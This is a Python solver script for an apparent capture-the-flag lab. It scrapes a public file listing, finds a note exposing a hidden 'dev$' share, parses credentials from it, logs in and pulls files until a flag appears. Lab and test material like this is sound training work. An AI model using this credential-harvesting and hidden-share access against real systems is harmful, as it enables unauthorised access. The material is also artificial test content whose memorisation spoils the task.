"""Intended-path solver: public listing reveals hidden dev$ share and credentials."""

import re

import httpx

from openrange.content.solver import SolveResult, TaskResult, find_flags

USER_RE = re.compile(r"user\s+(\S+)")
PASS_RE = re.compile(r"pass\s+(\S+)")


def solve(ctx) -> SolveResult:  # type: ignore[no-untyped-def]
    base = ctx.url().rstrip("/")
    detail = None
    captured = None

    # 1. Browse the public share mirror.
    home = httpx.get(f"{base}/", timeout=10)
    links = re.findall(r"/files/public/[A-Za-z0-9._-]+", home.text)

    # 2. Read public notes until one mentions the hidden dev$ share.
    notes = ""
    for link in sorted(set(links)):
        res = httpx.get(f"{base}{link}", timeout=10)
        if "dev$" in res.text:
            notes = res.text
            break
    if not notes:
        return SolveResult(
            results=[
                TaskResult(
                    task_id="reach-dev-share",
                    ok=False,
                    detail="no public file mentions the hidden dev share",
                )
            ]
        )

    user_m = USER_RE.search(notes)
    pass_m = PASS_RE.search(notes)
    if not user_m or not pass_m:
        return SolveResult(
            results=[
                TaskResult(
                    task_id="reach-dev-share",
                    ok=False,
                    detail="share name found but credentials not parsed from notes",
                )
            ]
        )
    auth = (user_m.group(1), pass_m.group(1))

    # 3. Address the hidden share directly, exactly like smbclient would.
    listing = httpx.get(f"{base}/browse/dev$/", auth=auth, timeout=10)
    if listing.status_code != 200:
        return SolveResult(
            results=[
                TaskResult(
                    task_id="reach-dev-share",
                    ok=False,
                    detail=f"dev$ browse returned {listing.status_code}",
                )
            ]
        )

    # 4. Pull files until the flag surfaces.
    file_links = re.findall(
        r"/files/dev%24/[A-Za-z0-9._%-]+|/files/dev\$/[A-Za-z0-9._-]+", listing.text
    )
    for link in dict.fromkeys(file_links):
        res = httpx.get(f"{base}{link}", auth=auth, timeout=10)
        flags = find_flags(res.text)
        if flags:
            captured = flags[0]
            detail = f"hidden dev$ share reached as {auth[0]}; flag in mirrored file"
            break

    return SolveResult(
        results=[
            TaskResult(
                task_id="reach-dev-share", ok=captured is not None, captured=captured, detail=detail
            )
        ]
    )
